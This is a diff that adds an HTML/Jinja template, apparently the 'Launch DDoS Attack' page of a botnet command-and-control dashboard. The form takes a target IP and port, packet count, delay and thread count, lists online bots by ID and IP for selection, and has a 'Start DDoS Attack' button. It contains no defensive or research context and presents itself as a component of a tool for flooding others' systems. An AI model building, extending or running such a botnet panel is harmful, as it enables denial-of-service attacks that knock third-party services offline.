@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Launch DDoS Attack</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 18px;
+        }
+        form {
+            width: 60%;
+            margin: 30px auto;
+            padding: 20px;
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            box-shadow: 0 0 8px #0f0;
+        }
+        label {
+            display: block;
+            margin-top: 15px;
+        }
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            padding: 8px;
+            background-color: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+            margin-top: 5px;
+        }
+        input[type="submit"] {
+            margin-top: 20px;
+            width: 100%;
+            padding: 10px;
+            background-color: #000;
+            color: #0f0;
+            font-weight: bold;
+            font-size: 16px;
+            border: 1px solid #0f0;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        input[type="submit"]:hover {
+            background-color: #020;
+        }
+        .bot-checkbox {
+            margin: 5px 0;
+        }
+        h2 {
+            text-align: center;
+            margin-top: 30px;
+        }
+        .back-link {
+            text-align: center;
+            margin-top: 40px;
+        }
+        a {
+            color: #0f0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>Launch DDoS Attack</h2>
+
+    <form method="POST">
+        <label>Target IP:</label>
+        <input type="text" name="target_ip" required>
+
+        <label>Target Port:</label>
+        <input type="number" name="target_port" required>
+
+        <label>Packets:</label>
+        <input type="number" name="packets" value="1000">
+
+        <label>Delay (sec):</label>
+        <input type="text" name="delay" value="0.01">
+
+        <label>Threads:</label>
+        <input type="number" name="threads" value="10">
+
+        <label>Select Bots:</label>
+        {% for bot in online_bots %}
+            <div class="bot-checkbox">
+                <input type="checkbox" name="bots" value="{{ bot.id }}">
+                {{ bot.id }} ({{ bot.ip }})
+            </div>
+        {% else %}
+            <p style="color: red;">No online bots available.</p>
+        {% endfor %}
+
+        <input type="submit" value="Start DDoS Attack">
+    </form>
+
+    <div class="back-link">
+        <a href="/">← Back to Dashboard</a>
+    </div>
+</body>
+</html>
